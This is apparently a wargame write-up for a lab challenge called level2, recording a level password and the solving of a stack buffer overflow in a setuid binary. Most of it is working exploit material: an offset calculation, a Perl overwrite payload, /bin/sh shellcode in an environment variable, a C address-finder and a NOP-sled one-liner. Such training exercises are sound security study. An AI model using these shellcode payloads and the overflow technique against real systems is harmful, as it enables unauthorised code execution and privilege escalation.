PASS 
============
PIZIPMWKEC


browse to /levels/level2
do ls -la
level2.c is the source for level2 binary

can either : 
	* exploit the SBO in level2
	* look into level2_alt : caesar cipher. use that password to get into level 3 (su level3, and provide password)

SBO 
=========
i believe the size needed to overflow is 4108 bytes wide, anything after that gets written in the EIP
doing 

	$	/levels/level2/level2 fsckmelogic $(perl -e 'print "A"x4108 . "\x99\xdf\xff\xbf"')

produces nothing, but changing 4108 to 4107/4109 produces a segmentation fault. 

the retun address (0xBFFFDF99) is found by setting : 

	$	export PAYLOAD=$'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'

and then executing /tmp/dio_finder.o, where dio_finder.c is : 

#include <stdlib.h>
#include <stdio.h>
 
int main(void) {
  
    printf("%#x \n", getenv("PAYLOAD"));
    return 0;
}

alternatively one could use the nop-sled approach

/levels/level2/level2 fsckmelogic `python -c 'print "\x90"*4083+"\x60\x6a\x0b\x58\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80\x61"+"\x61\xda\xff\xbf"'`

where 0xBFFFDA61 is somewhere on the NOPsled. In particular, if one debugs the program and breaks at 0x08048566 push %eax, on will notece that %eax holds the pointer to the first argument of strcpy. our string is held in the variable, and hence anything lower than that value of eax will land in the NOPsled and lead to executing our shell code
